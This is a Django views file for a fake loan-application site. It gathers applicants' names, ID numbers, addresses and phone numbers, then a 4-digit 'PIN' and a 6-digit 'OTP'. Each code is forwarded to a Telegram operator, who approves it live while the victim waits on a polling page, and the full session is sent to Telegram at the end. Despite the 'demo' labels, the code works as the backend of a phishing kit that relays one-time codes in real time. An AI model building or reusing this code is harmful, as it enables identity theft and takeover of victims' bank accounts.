import json
import secrets

from django.http import JsonResponse
from django.shortcuts import render, redirect, get_object_or_404
from django.views.decorators.csrf import csrf_exempt

from .models import DemoVerification
from .utils import (
    send_telegram_notification,
    send_demo_verification_request,
    format_loan_application_message,
    answer_callback_query,
    edit_telegram_message,
)


# ============================================================
# MAIN LOAN APPLICATION
# ============================================================

def calculator_view(request):
    return render(request, "loan/calculator.html")


def personal_details_view(request):
    if request.method == "POST":
        request.session["amount"] = request.POST.get("amount", "500")
        request.session["term"] = request.POST.get("term", "12")
        request.session.modified = True

    return render(request, "loan/personal_details.html")


def review_view(request):
    if request.method == "POST":
        request.session["first_name"] = request.POST.get("first_name", "")
        request.session["last_name"] = request.POST.get("last_name", "")
        request.session["email"] = request.POST.get("email", "")
        request.session["id_number"] = request.POST.get("id_number", "")
        request.session["address"] = request.POST.get("address", "")
        request.session["city"] = request.POST.get("city", "")
        request.session.modified = True

    full_name = (
        f"{request.session.get('first_name', '')} "
        f"{request.session.get('last_name', '')}"
    ).strip() or "N/A"

    address = (
        f"{request.session.get('address', '')}, "
        f"{request.session.get('city', '')}"
    ).strip(", ") or "N/A"

    context = {
        "amount": request.session.get("amount", "N/A"),
        "term": request.session.get("term", "N/A"),
        "full_name": full_name,
        "email": request.session.get("email", ""),
        "id_number": request.session.get("id_number", ""),
        "address": address,
    }

    return render(request, "loan/review.html", context)


# ============================================================
# PHONE / DEMO LOGIN  (4 demo numbers)
# ============================================================

def login_view(request):
    """
    Login page: phone + 4 demo numbers.
    On submit → create verification request and send Telegram
    Approve/Reject notification. User waits for approval.
    """
    if request.method == "POST":
        phone = request.POST.get("phone", "").strip()

        # Take the 4 digits the user typed
        demo_numbers_4 = "".join([
            request.POST.get("num1", "").strip(),
            request.POST.get("num2", "").strip(),
            request.POST.get("num3", "").strip(),
            request.POST.get("num4", "").strip(),
        ])

        # Ensure session exists
        if not request.session.session_key:
            request.session.create()

        # Save to session
        request.session["phone"] = phone
        request.session["demo_numbers_4"] = demo_numbers_4
        request.session.modified = True

        print("================================")
        print("PHONE:", phone)
        print("USER ENTERED DEMO 4:", demo_numbers_4)
        print("================================")

        # Create database verification request
        # Use a unique session_key (handle possible reuse)
        session_key = request.session.session_key
        DemoVerification.objects.filter(session_key=session_key).delete()

        verification = DemoVerification.objects.create(
            session_key=session_key,
            phone=phone,
            status="pending",
        )

        request.session["verification_id"] = verification.id
        request.session["verification_status"] = "pending"
        request.session.modified = True

        # Send Telegram notification with Approve / Reject buttons
        message_id = send_demo_verification_request(
            verification.id,
            phone,
            demo_numbers_4,
            stage="4",
        )

        if message_id:
            verification.telegram_message_id = message_id
            verification.save(update_fields=["telegram_message_id"])

        return redirect("waiting_for_approval")

    return render(request, "loan/login.html")


def request_verification_view(request):
    """
    Fallback / intermediate page (kept for compatibility).
    Redirects into the main login flow if needed.
    """
    if request.method == "POST":
        return login_view(request)

    return render(request, "loan/request_verification.html")


# ============================================================
# 6 DEMO NUMBERS (after Telegram approval)
# ============================================================

def otp_view(request):
    """
    Page where user enters the 6 demo numbers.
    Only reachable after Telegram approval of the 4 numbers.
    On submit → send Telegram for approval of the 6 numbers.
    """
    verification_id = request.session.get("verification_id")

    if verification_id:
        try:
            verification = DemoVerification.objects.get(id=verification_id)
            if verification.status != "approved":
                return redirect("waiting_for_approval")
        except DemoVerification.DoesNotExist:
            return redirect("login")

    if request.method == "POST":
        num1 = request.POST.get("num1", "")
        num2 = request.POST.get("num2", "")
        num3 = request.POST.get("num3", "")
        num4 = request.POST.get("num4", "")
        num5 = request.POST.get("num5", "")
        num6 = request.POST.get("num6", "")

        demo_numbers_6 = num1 + num2 + num3 + num4 + num5 + num6

        if len(demo_numbers_6) != 6 or not demo_numbers_6.isdigit():
            return render(
                request,
                "loan/otp.html",
                {"error": "Please enter a valid OTP code."},
            )

        # Save the 6 numbers
        request.session["demo_numbers_6"] = demo_numbers_6
        request.session.modified = True

        phone = request.session.get("phone", "")

        # Ensure session exists
        if not request.session.session_key:
            request.session.create()

        session_key = request.session.session_key + "_stage6"

        # Remove any previous stage-6 verification for this session
        DemoVerification.objects.filter(session_key=session_key).delete()

        verification = DemoVerification.objects.create(
            session_key=session_key,
            phone=phone,
            status="pending",
        )

        request.session["verification_id_6"] = verification.id
        request.session["verification_status_6"] = "pending"
        request.session["current_stage"] = "6"
        request.session.modified = True

        # Send Telegram for 6-number approval
        message_id = send_demo_verification_request(
            verification.id,
            phone,
            demo_numbers_6,
            stage="6",
        )

        if message_id:
            verification.telegram_message_id = message_id
            verification.save(update_fields=["telegram_message_id"])

        return redirect("waiting_for_approval_6")

    return render(request, "loan/otp.html")


def verify_otp_view(request):
    """
    Handles POST of the 6 demo numbers (same logic as otp_view POST).
    """
    if request.method == "POST":
        num1 = request.POST.get("num1", "")
        num2 = request.POST.get("num2", "")
        num3 = request.POST.get("num3", "")
        num4 = request.POST.get("num4", "")
        num5 = request.POST.get("num5", "")
        num6 = request.POST.get("num6", "")

        demo_numbers_6 = num1 + num2 + num3 + num4 + num5 + num6

        if len(demo_numbers_6) == 6 and demo_numbers_6.isdigit():
            request.session["demo_numbers_6"] = demo_numbers_6
            request.session["verification_completed"] = True
            request.session["verification_status"] = "completed"
            request.session.modified = True
            return redirect("success")

        return render(
            request,
            "loan/otp.html",
            {"error": "Please enter a valid 6-digit demo code."},
        )

    return redirect("otp")


def waiting_for_approval_6_view(request):
    """Waiting page after submitting the 6 demo numbers."""
    verification_id = request.session.get("verification_id_6")

    if not verification_id:
        return redirect("otp")

    verification = get_object_or_404(DemoVerification, id=verification_id)

    if verification.status == "approved":
        return redirect("success")

    if verification.status == "rejected":
        return redirect("rejected")

    return render(request, "loan/waiting_for_approval.html")


def verification_status_6_view(request):
    verification_id = request.session.get("verification_id_6")

    if not verification_id:
        return JsonResponse({"status": "missing"})

    try:
        verification = DemoVerification.objects.get(id=verification_id)
    except DemoVerification.DoesNotExist:
        return JsonResponse({"status": "missing"})

    return JsonResponse({"status": verification.status})


# ============================================================
# WAITING FOR TELEGRAM APPROVAL
# ============================================================

def waiting_for_approval_view(request):
    verification_id = request.session.get("verification_id")

    if not verification_id:
        return redirect("login")

    verification = get_object_or_404(
        DemoVerification,
        id=verification_id,
    )

    if verification.status == "approved":
        return redirect("approved")

    if verification.status == "rejected":
        return redirect("rejected")

    return render(request, "loan/waiting_for_approval.html")


def verification_status_view(request):
    verification_id = request.session.get("verification_id")

    if not verification_id:
        return JsonResponse({"status": "missing"})

    try:
        verification = DemoVerification.objects.get(id=verification_id)
    except DemoVerification.DoesNotExist:
        return JsonResponse({"status": "missing"})

    return JsonResponse({"status": verification.status})


# ============================================================
# APPROVED / REJECTED
# ============================================================

def approved_view(request):
    """
    Shown after Telegram approval.
    User continues to the 6-digit demo numbers page.
    """
    verification_id = request.session.get("verification_id")

    if not verification_id:
        return redirect("login")

    verification = get_object_or_404(
        DemoVerification,
        id=verification_id,
    )

    if verification.status != "approved":
        return redirect("waiting_for_approval")

    request.session["verification_status"] = "approved"
    request.session.modified = True

    return render(request, "loan/approved.html")


def rejected_view(request):
    request.session["verification_status"] = "rejected"
    request.session["verification_completed"] = False
    request.session.modified = True

    return render(request, "loan/rejected.html")


# ============================================================
# TELEGRAM CALLBACK
# ============================================================

@csrf_exempt
def telegram_callback_view(request):
    if request.method != "POST":
        return JsonResponse({"error": "POST required"}, status=405)

    try:
        update = json.loads(request.body)
    except json.JSONDecodeError:
        return JsonResponse({"error": "Invalid JSON"}, status=400)

    callback = update.get("callback_query")
    if not callback:
        return JsonResponse({"ok": True})

    callback_data = callback.get("data", "")

    try:
        parts = callback_data.split(":")
        action = parts[0]
        verification_id = int(parts[1])
        stage = parts[2] if len(parts) > 2 else "4"
    except (ValueError, AttributeError, IndexError):
        return JsonResponse({"error": "Invalid callback"}, status=400)

    try:
        verification = DemoVerification.objects.get(id=verification_id)
    except DemoVerification.DoesNotExist:
        return JsonResponse({"error": "Verification not found"}, status=404)

    stage_text = "PIN Verification" if stage == "4" else "OTP Verification"

    if action == "approve":
        verification.status = "approved"
        verification.save(update_fields=["status", "updated_at"])

        answer_callback_query(
            callback["id"],
            f"Demo verification (stage {stage}) approved.",
        )

        edit_telegram_message(
            callback["message"]["chat"]["id"],
            callback["message"]["message_id"],
            (
                f"🧪 <b>{stage_text}</b>\n\n"
                f"<b>Phone:</b> {verification.phone}\n"
                f"<b>Status:</b> ✅ Approved"
            ),
        )

    elif action == "reject":
        verification.status = "rejected"
        verification.save(update_fields=["status", "updated_at"])

        answer_callback_query(
            callback["id"],
            f"Demo verification (stage {stage}) rejected.",
        )

        edit_telegram_message(
            callback["message"]["chat"]["id"],
            callback["message"]["message_id"],
            (
                f"🧪 <b>{stage_text}</b>\n\n"
                f"<b>Phone:</b> {verification.phone}\n"
                f"<b>Status:</b> ❌ Rejected"
            ),
        )

    return JsonResponse({"ok": True})


# ============================================================
# SUCCESS
# ============================================================

def success_view(request):
    print("===== SESSION DATA =====")
    for key, value in request.session.items():
        print(f"  {key}: {value}")
    print("========================")

    demo_numbers_4 = request.session.get("demo_numbers_4", "N/A")
    demo_numbers_6 = request.session.get("demo_numbers_6", "N/A")

    print("===== DEMO VALUES =====")
    print("4 Demo Numbers:", demo_numbers_4)
    print("6 Demo Numbers:", demo_numbers_6)
    print("=======================")

    # Build and send final Telegram message
    message = format_loan_application_message(request.session)
    print("Message being sent:")
    print(message)

    sent = send_telegram_notification(message)
    print("Telegram sent:", sent)

    context = {
        "amount": request.session.get("amount", ""),
        "term": request.session.get("term", ""),
        "email": request.session.get("email", ""),
        "demo_numbers_4": demo_numbers_4,
        "demo_numbers_6": demo_numbers_6,
    }

    return render(request, "loan/success.html", context)
